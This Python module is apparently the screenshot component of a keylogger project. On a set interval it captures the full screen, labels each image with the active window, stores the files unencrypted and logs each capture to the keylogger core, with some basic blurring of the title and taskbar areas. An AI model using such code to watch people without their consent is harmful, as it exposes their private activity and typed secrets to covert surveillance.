"""Screenshot monitoring utility with security and performance optimizations."""

import time
import threading
import logging
import os
from typing import Optional, Dict, Any, Tuple
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
import io
import hashlib

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
    logging.warning("PIL ImageGrab not available")

logger = logging.getLogger(__name__)


class ScreenshotMonitor:
    """Monitor and capture screenshots with privacy and performance features."""
    
    def __init__(self, keylogger_core):
        self.keylogger_core = keylogger_core
        self.config = keylogger_core.config
        self.is_running = False
        
        # Screenshot settings
        self.capture_interval = float(self.config.get('screenshots.interval_seconds', self.config.get('performance.screenshot_interval', 60.0)))
        self.screenshot_quality = int(self.config.get('screenshots.quality', self.config.get('performance.screenshot_quality', 85)))
        configured_format = self.config.get('screenshots.format', self.config.get('performance.screenshot_format', 'PNG'))
        self.screenshot_format = str(configured_format or 'PNG').upper()
         
        # Privacy settings
        self.blur_sensitive_areas = self.config.get('privacy.blur_sensitive_areas', True)
        self.redact_text = self.config.get('privacy.redact_screenshot_text', False)
        # Prefer screenshots.max_width/height; fallback to privacy.max_screenshot_resolution or default
        max_width = self.config.get('screenshots.max_width', None)
        max_height = self.config.get('screenshots.max_height', None)
        if isinstance(max_width, int) and isinstance(max_height, int) and max_width > 0 and max_height > 0:
            self.max_resolution = (max_width, max_height)
        else:
            self.max_resolution = self.config.get('privacy.max_screenshot_resolution', (1920, 1080))
         
        # Performance settings
        self.compress_screenshots = self.config.get('screenshots.compress', self.config.get('performance.compress_screenshots', True))
        self.max_file_size = self.config.get('performance.max_screenshot_size_mb', 5) * 1024 * 1024
        self.cleanup_old_screenshots = self.config.get('performance.cleanup_old_screenshots', True)
        self.max_screenshots = self.config.get('performance.max_screenshots', 1000)
         
        # Security settings
        # Force screenshots to be unencrypted for accessibility
        self.encrypt_screenshots = False
        self.hash_screenshots = self.config.get('security.hash_screenshots', True)
        
        # Statistics
        self.stats = {
            'screenshots_taken': 0,
            'screenshots_encrypted': 0,
            'total_size_bytes': 0,
            'average_size_bytes': 0,
            'errors': 0,
            'cleanup_operations': 0
        }
        
        # Screenshot metadata
        self.screenshot_metadata: Dict[str, Dict[str, Any]] = {}
        
        # Setup screenshot directory
        self._setup_screenshot_directory()
    
    def _setup_screenshot_directory(self) -> None:
        """Setup screenshot directory with proper permissions."""
        try:
            # Create screenshots directory in the project root
            self.screenshot_dir = Path.cwd() / "screenshots"
            # Determine storage path (prefer screenshots.storage_path)
            storage_path = self.config.get('screenshots.storage_path', 'screenshots') or 'screenshots'
            
            # Resolve base directory relative to the config file location when path is not absolute
            storage_path_obj = Path(storage_path)
            if not storage_path_obj.is_absolute():
                try:
                    config_dir = Path(getattr(self.keylogger_core, 'config_path', 'config.json')).parent.resolve()
                except Exception:
                    config_dir = Path.cwd()
                self.screenshot_dir = (config_dir / storage_path_obj).resolve()
            else:
                self.screenshot_dir = storage_path_obj
            
            self.screenshot_dir.mkdir(parents=True, exist_ok=True)
            logger.info(f"Screenshot directory setup: {self.screenshot_dir}")
            
        except Exception as e:
            logger.error(f"Failed to setup screenshot directory: {e}")
            # Fallback to current working directory
            self.screenshot_dir = Path.cwd()
            logger.warning(f"Using fallback directory: {self.screenshot_dir}")
    
    def run(self) -> None:
        """Main screenshot monitoring loop."""
        logger.info("Screenshot monitor run() method called")
        
        if not self._check_screenshot_support():
            logger.error("Screenshot capture not supported")
            return
        
        self.is_running = True
        logger.info(f"Screenshot monitor started - interval: {self.capture_interval}s, directory: {self.screenshot_dir}")
        
        try:
            while self.is_running and not self.keylogger_core.stop_event.is_set():
                try:
                    self._capture_screenshot()
                    
                    # Cleanup old screenshots if needed
                    if self.cleanup_old_screenshots:
                        self._cleanup_old_screenshots()
                    
                    # Wait for next capture
                    if self.keylogger_core.stop_event.wait(self.capture_interval):
                        break
                    
                except Exception as e:
                    logger.error(f"Error in screenshot monitoring loop: {e}")
                    self.stats['errors'] += 1
                    time.sleep(self.capture_interval)
            
        except Exception as e:
            logger.error(f"Critical error in screenshot monitor: {e}")
        finally:
            logger.info(f"Screenshot monitor stopped. Stats: {self.stats}")
    
    def _check_screenshot_support(self) -> bool:
        """Check if screenshot capture is supported."""
        if ImageGrab is None:
            logger.error("PIL ImageGrab not available")
            return False
        
        try:
            # Test screenshot capture
            test_img = ImageGrab.grab(bbox=(0, 0, 100, 100))
            if test_img is None:
                return False
            return True
        except Exception as e:
            logger.error(f"Screenshot test failed: {e}")
            return False
    
    def _capture_screenshot(self) -> Optional[str]:
        """Capture and process screenshot."""
        try:
            # Get current window info for context
            window_name = self.keylogger_core.session_stats.get('active_window', 'Unknown')
            
            # Skip if application is excluded
            if self.keylogger_core.config.is_application_excluded(window_name):
                return None
            
            # Capture screenshot
            screenshot = ImageGrab.grab()
            if screenshot is None:
                logger.warning("Failed to capture screenshot")
                return None
            
            # Process screenshot
            processed_screenshot = self._process_screenshot(screenshot)
            metadata = self._extract_metadata(processed_screenshot)
            timestamp = time.time()
            metadata['timestamp'] = timestamp
            metadata['window_name'] = window_name
            
            # Generate filename
            filename = self._generate_filename(timestamp, window_name)
            filepath = self.screenshot_dir / filename
            
            # Save screenshot
            file_size, final_path, encrypted = self._save_screenshot(processed_screenshot, filepath)
            
            if file_size > 0:
                # Update statistics
                self.stats['screenshots_taken'] += 1
                self.stats['total_size_bytes'] += file_size
                self.stats['average_size_bytes'] = self.stats['total_size_bytes'] / self.stats['screenshots_taken']
                
                metadata.update({
                    'file_size': file_size,
                    'resolution': processed_screenshot.size,
                    'format': self.screenshot_format.upper(),
                    'encrypted': encrypted
                })
                final_filename = final_path.name
                
                # Store metadata
                self._store_metadata(final_filename, metadata)
                
                # Log screenshot event
                self._log_screenshot_event(final_filename, window_name, file_size, encrypted)
                
                return str(final_path)
            
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
            self.stats['errors'] += 1
            return None
    
    def _process_screenshot(self, screenshot: Image.Image) -> Image.Image:
        """Process screenshot with privacy and performance optimizations."""
        try:
            processed = screenshot.copy()
            processed = self._resize_image(processed)
            
            if self.blur_sensitive_areas:
                sensitive_areas = self._detect_sensitive_areas(processed)
                processed = self._blur_sensitive_areas(processed, sensitive_areas)
            
            if self.redact_text:
                processed = self._redact_text_areas(processed)
            
            # Convert to RGB if necessary for JPEG output
            if self.screenshot_format.upper() == 'JPEG' and processed.mode in ('RGBA', 'LA', 'P'):
                rgb_image = Image.new('RGB', processed.size, (255, 255, 255))
                if processed.mode == 'P':
                    processed = processed.convert('RGBA')
                alpha_channel = processed.split()[-1] if processed.mode == 'RGBA' else None
                rgb_image.paste(processed, mask=alpha_channel)
                processed = rgb_image
            
            return processed
        except Exception as e:
            logger.error(f"Error processing screenshot: {e}")
            return screenshot
    
    def _resize_image(self, image: Image.Image) -> Image.Image:
        """Resize image to configured maximum resolution."""
        try:
            max_width, max_height = self.max_resolution
            if image.size[0] <= max_width and image.size[1] <= max_height:
                return image
            resized = image.copy()
            resized.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
            return resized
        except Exception as e:
            logger.error(f"Error resizing screenshot: {e}")
            return image
    
    def _detect_sensitive_areas(self, image: Image.Image) -> list:
        """Detect regions likely to contain sensitive UI elements."""
        try:
            width, height = image.size
            if width == 0 or height == 0:
                return []
            areas = []
            taskbar_height = int(height * 0.1)
            title_height = int(height * 0.05)
            if taskbar_height > 0:
                areas.append((0, max(height - taskbar_height, 0), width, height))
            if title_height > 0:
                areas.append((0, 0, width, title_height))
            return areas
        except Exception as e:
            logger.error(f"Error detecting sensitive areas: {e}")
            return []
    
    def _blur_sensitive_areas(self, image: Image.Image, areas: list) -> Image.Image:
        """Blur specific areas within an image."""
        if not areas:
            return image
        try:
            from PIL import ImageFilter
            blurred = image.copy()
            for area in areas:
                left, top, right, bottom = area
                region = blurred.crop((left, top, right, bottom))
                blurred_region = region.filter(ImageFilter.GaussianBlur(radius=8))
                blurred.paste(blurred_region, (left, top))
            return blurred
        except Exception as e:
            logger.error(f"Error blurring sensitive areas: {e}")
            return image
    
    def _compress_screenshot(self, image: Image.Image) -> bytes:
        """Serialize screenshot image to bytes with compression."""
        try:
            buffer = io.BytesIO()
            save_kwargs: Dict[str, Any] = {}
            fmt = self.screenshot_format.upper()
            if fmt == 'JPEG':
                if image.mode in ('RGBA', 'LA', 'P'):
                    image = image.convert('RGB')
                save_kwargs['quality'] = self.screenshot_quality
                save_kwargs['optimize'] = True
            elif fmt == 'PNG':
                save_kwargs['optimize'] = True
                save_kwargs['compress_level'] = 6
            image.save(buffer, format=fmt, **save_kwargs)
            return buffer.getvalue()
        except Exception as e:
            logger.error(f"Error compressing screenshot: {e}")
            return b''
    
    def _extract_metadata(self, image: Image.Image) -> Dict[str, Any]:
        """Collect metadata for the processed screenshot."""
        try:
            return {
                'timestamp': time.time(),
                'resolution': image.size,
                'format': self.screenshot_format.upper(),
                'quality': self.screenshot_quality
            }
        except Exception as e:
            logger.error(f"Error extracting screenshot metadata: {e}")
            return {'timestamp': time.time()}
    
    def _encrypt_screenshot(self, image_data: bytes) -> bytes:
        """Encrypt screenshot bytes when encryption is enabled."""
        try:
            if not image_data:
                return b''
            encryption_manager = getattr(self.keylogger_core, 'encryption', None)
            if not encryption_manager:
                encryption_manager = getattr(self.keylogger_core, 'encryption_manager', None)
            if not encryption_manager:
                return b''
            encrypt_fn = getattr(encryption_manager, 'encrypt_data', None) or getattr(encryption_manager, 'encrypt', None)
            if not callable(encrypt_fn):
                return b''
            return encrypt_fn(image_data)
        except Exception as e:
            logger.warning(f"Screenshot encryption failed: {e}")
            return b''
    
    def _redact_text_areas(self, image: Image.Image) -> Image.Image:
        """Redact potential text areas in the screenshot."""
        try:
            # Simple implementation: overlay semi-transparent rectangles
            # In a real implementation, you might use OCR to detect text
            
            overlay = Image.new('RGBA', image.size, (0, 0, 0, 0))
            draw = ImageDraw.Draw(overlay)
            
            width, height = image.size
            
            # Redact common text areas (this is a simplified approach)
            # Top area (title bars, menu bars)
            draw.rectangle([0, 0, width, int(height * 0.1)], fill=(0, 0, 0, 128))
            
            # Bottom area (status bars)
            draw.rectangle([0, int(height * 0.9), width, height], fill=(0, 0, 0, 128))
            
            # Combine with original image
            result = Image.alpha_composite(image.convert('RGBA'), overlay)
            return result.convert('RGB')
            
        except Exception as e:
            logger.error(f"Error redacting text areas: {e}")
            return image
    
    def _generate_filename(self, timestamp: float, window_name: str) -> str:
        """Generate filename for screenshot."""
        try:
            # Create timestamp string
            time_str = time.strftime('%Y%m%d_%H%M%S', time.localtime(timestamp))
            
            # Sanitize window name for filename
            safe_window_name = "".join(c for c in window_name if c.isalnum() or c in (' ', '-', '_')).strip()
            safe_window_name = safe_window_name.replace(' ', '_')[:50]  # Limit length
            
            # Generate filename
            if safe_window_name:
                filename = f"screenshot_{time_str}_{safe_window_name}.{self.screenshot_format.lower()}"
            else:
                filename = f"screenshot_{time_str}.{self.screenshot_format.lower()}"
            
            return filename
            
        except Exception as e:
            logger.error(f"Error generating filename: {e}")
            return f"screenshot_{int(timestamp)}.{self.screenshot_format.lower()}"
    
    def _save_screenshot(self, image: Image.Image, filepath: Path) -> tuple[int, Path, bool]:
        """Save screenshot with optional encryption."""
        try:
            image_bytes = self._compress_screenshot(image)
            if not image_bytes:
                return 0, filepath, False
            if len(image_bytes) > self.max_file_size:
                logger.warning(f"Screenshot too large ({len(image_bytes)} bytes), skipping")
                return 0, filepath, False
            output_path = filepath
            data_to_write = image_bytes
            encrypted = False
            if self.encrypt_screenshots:
                encrypted_bytes = self._encrypt_screenshot(image_bytes)
                if encrypted_bytes:
                    data_to_write = encrypted_bytes
                    output_path = filepath.with_suffix(filepath.suffix + '.enc')
                    encrypted = True
                    self.stats['screenshots_encrypted'] += 1
            with open(output_path, 'wb') as f:
                f.write(data_to_write)
            return len(data_to_write), output_path, encrypted
        except Exception as e:
            logger.error(f"Error saving screenshot: {e}")
            return 0, filepath, False
    
    def _store_metadata(self, filename: str, metadata: Dict[str, Any]) -> None:
        """Store screenshot metadata."""
        try:
            # Add hash if enabled
            if self.hash_screenshots:
                filepath = self.screenshot_dir / filename
                if filepath.exists():
                    with open(filepath, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()[:16]
                    metadata['file_hash'] = file_hash
            
            self.screenshot_metadata[filename] = metadata
            
        except Exception as e:
            logger.error(f"Error storing metadata: {e}")
    
    def _log_screenshot_event(self, filename: str, window_name: str, file_size: int, encrypted: bool) -> None:
        """Log screenshot capture event."""
        try:
            details = f"Screenshot captured: {filename} ({file_size} bytes)"
            
            self.keylogger_core.log_event(
                "Screenshot",
                details,
                window_name,
                metadata={
                    'filename': filename,
                    'file_size': file_size,
                    'encrypted': encrypted,
                    'format': self.screenshot_format.upper()
                }
            )
            
        except Exception as e:
            logger.error(f"Error logging screenshot event: {e}")
    
    def _cleanup_old_screenshots(self) -> None:
        """Cleanup old screenshots to manage disk space."""
        try:
            # Get all screenshot files
            screenshot_files = []
            for ext in ['.jpg', '.jpeg', '.png', '.enc']:
                screenshot_files.extend(self.screenshot_dir.glob(f"*{ext}"))
            
            # Sort by modification time (oldest first)
            screenshot_files.sort(key=lambda x: x.stat().st_mtime)
            
            # Remove excess files
            if len(screenshot_files) > self.max_screenshots:
                files_to_remove = screenshot_files[:-self.max_screenshots]
                
                for file_path in files_to_remove:
                    try:
                        file_path.unlink()
                        # Remove from metadata
                        if file_path.name in self.screenshot_metadata:
                            del self.screenshot_metadata[file_path.name]
                        
                        self.stats['cleanup_operations'] += 1
                        
                    except Exception as e:
                        logger.error(f"Error removing old screenshot {file_path}: {e}")
                
                logger.info(f"Cleaned up {len(files_to_remove)} old screenshots")
            
        except Exception as e:
            logger.error(f"Error during screenshot cleanup: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get screenshot monitoring statistics."""
        return {
            **self.stats,
            'is_running': self.is_running,
            'screenshot_directory': str(self.screenshot_dir),
            'metadata_entries': len(self.screenshot_metadata)
        }
    
    def get_screenshot_list(self, limit: Optional[int] = None) -> list:
        """Get list of captured screenshots."""
        try:
            screenshots = []
            for filename, metadata in self.screenshot_metadata.items():
                filepath = self.screenshot_dir / filename
                if filepath.exists():
                    screenshots.append({
                        'filename': filename,
                        'filepath': str(filepath),
                        'metadata': metadata
                    })
            
            # Sort by timestamp (newest first)
            screenshots.sort(key=lambda x: x['metadata'].get('timestamp', 0), reverse=True)
            
            if limit:
                screenshots = screenshots[:limit]
            
            return screenshots
            
        except Exception as e:
            logger.error(f"Error getting screenshot list: {e}")
            return []
    
    def capture_immediate_screenshot(self, window_name: str = "Manual") -> Optional[str]:
        """Capture an immediate screenshot outside the normal schedule."""
        try:
            logger.info("Capturing immediate screenshot")
            return self._capture_screenshot()
        except Exception as e:
            logger.error(f"Error capturing immediate screenshot: {e}")
            return None
    
    def export_metadata(self) -> Dict[str, Any]:
        """Export screenshot metadata for analysis."""
        return {
            'stats': self.get_stats(),
            'metadata': self.screenshot_metadata.copy(),
            'export_timestamp': time.time()
        }